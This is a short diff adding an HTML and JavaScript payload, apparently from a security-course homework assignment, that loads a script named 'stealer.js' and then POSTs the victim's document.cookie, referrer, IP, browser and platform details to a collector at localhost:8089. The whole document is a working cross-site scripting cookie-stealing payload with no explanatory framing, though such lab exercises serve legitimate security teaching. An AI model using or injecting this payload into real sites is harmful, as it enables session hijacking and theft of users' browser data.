@@ -1,0 +1,7 @@
+<script src="file://c:\Users\Isaac\Documents\CSEC380\Homework6\javascript\stealer.js">
+</script>
+<script>
+var messenger = new XMLHttpRequest();
+messenger.open("POST", "http://localhost:8089", true);
+messenger.send(document.cookie + "#" + document.referrer + "#" + window.location.protocol + "#" + userip + "#" + navigator.appName + "-" + navigator.product + "#" + navigator.platform + "#" + Date());
+</script>
